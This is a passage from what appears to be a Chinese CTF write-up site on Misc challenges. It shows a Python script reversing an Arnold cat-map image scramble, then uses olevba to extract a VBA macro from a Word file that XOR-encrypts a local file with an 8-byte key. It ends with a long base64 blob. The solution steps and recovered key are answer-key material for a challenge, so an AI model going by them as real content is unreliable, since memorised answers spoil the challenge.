\u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0         \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0   \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0\n \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0 \u25a0  \n\nProcess finished with exit code 0\n</code></pre> <p>\u9898\u76ee\u540d\u6709\u63d0\u793a\u732b\uff0c\u6700\u540e\u5e94\u8be5\u662f Arnold \u53d8\u6362</p> <pre><code>from PIL import Image\n\nimg = Image.open('flag.png')\nif img.mode == \"P\":\n    img = img.convert(\"RGB\")\nassert img.size[0] == img.size[1]\ndim = width, height = img.size\n\nst = 33\na = 121\nb = 144\nfor _ in range(st):\n    with Image.new(img.mode, dim) as canvas:\n        for nx in range(img.size[0]):\n            for ny in range(img.size[0]):\n                y = (ny - nx * a) % width\n                x = (nx - y * b) % height\n                canvas.putpixel((y, x), img.getpixel((ny, nx)))\ncanvas.show()\ncanvas.save('result.png')\n</code></pre> <p></p>"},{"location":"Misc/Chapter1/1-25/","title":"\u52a0\u5bc6 Word \u7684\u5b8f\u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter1/1-25/#\u52a0\u5bc6-word-\u7684\u5b8f\u9690\u5199key","title":"\u52a0\u5bc6 Word \u7684\u5b8f\u9690\u5199\uff08Key\uff09","text":"<p>\u6709\u4e2a\u52a0\u5bc6\u6587\u6863\uff0c\u6240\u4ee5\u8981\u7834\u89e3\u5bc6\u7801\uff0c010 \u6253\u5f00\u5206\u6790\u4e00\u4e0b</p> <p>\u62c9\u5230\u5c3e\u90e8\u8303\u56f4\u5185\u4e5f\u662f\u6709\u5f88\u591a\u5b57\u7b26\u4e32\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u6bb5\u5341\u516d\u8fdb\u5236\uff0c\u4f46\u8fd9\u4e9b\u90fd\u89e3\u4e0d\u51fa\u6765\u6ca1\u5565\u7528\uff0c\u4ed4\u7ec6\u5f80\u4e0a\u770b\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b\u5b8f\u7684\u73b0\u8c61</p> <p></p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528 oletools \u63d0\u53d6\u51fa vba \u811a\u672c</p> <p><code>oletools</code> \u662f\u4e00\u5957\u7531 Decalage \u5f00\u53d1\u7684\u5f00\u6e90\u5de5\u5177\u96c6</p> <p>\u4e13\u95e8\u7528\u4e8e\u5206\u6790 Microsoft OLE2 \u6587\u4ef6\uff08\u4e5f\u79f0 OLE Compound File\uff0c\u5982 <code>.doc</code>, <code>.xls</code>, <code>.ppt</code>, <code>.msi</code>, <code>.vsd</code> \u7b49\u65e7\u7248 Office \u683c\u5f0f\uff09</p> <p>\u4ee5\u53ca\u4e00\u4e9b\u73b0\u4ee3 OpenXML \u683c\u5f0f\uff08<code>.docm</code>, <code>.xlsm</code> \u7b49\uff09</p> <pre><code>pip install oletools\nolevba attachment.doc\n</code></pre> <p></p> <pre><code>Sub XOREncryptFile()\n    Dim numbers(8) As Integer\n    numbers = [19, 71, 122, 99, 65, 111, 43, 67]\n\n    ' \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u662f\u5426\u5b58\u5728\u540d\u4e3a \"abc\" \u7684\u6587\u4ef6\n    If Dir(\".\\abc\") = \"\" Then Exit Sub\n\n    ' \u8bfb\u53d6 abc \u6587\u4ef6\u5185\u5bb9\n    Open \".\\abc\" For Binary Read Write As #FileNumber\n    FileContent = Input$(LOF(FileNumber), #FileNumber)\n    Close #FileNumber\n\n    ' XOR \u52a0\u5bc6\n    For i = 1 To Len(FileContent)\n        EncryptedContent = EncryptedContent &amp; Chr(Asc(Mid(FileContent, i, 1)) Xor numbers((i - 1) Mod 8))\n    Next i\n\n    ' \u5199\u5165 enc \u6587\u4ef6\n    Open \".\\enc\" For Binary Write As #FileNumber\n    Put #FileNumber, , EncryptedContent\n    Close #FileNumber\nEnd Sub\n</code></pre> <p>\u6ce8\u610f\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u811a\u672c\u53ef\u4ee5\u5f97\u5230 <code>13477a63416f2b43</code> \u8fd9\u4e2a\u5c31\u662f\u5f02\u6216\u7684 Key</p> <p>\u800c\u88ab XOR \u7684\u5b57\u7b26\u4e32\u611f\u89c9\u50cf\u662f\u6587\u6863\u6700\u4e0b\u9762\u7684\u90a3\u4e00\u4e32\u5341\u516d\u8fdb\u5236</p> <p></p> <p></p> <p>\u7136\u540e\u5f97\u5230\u5bc6\u7801\u53bb\u6253\u5f00\u6587\u6863\u5f97\u5230\u4fe1\u606f</p> <pre><code>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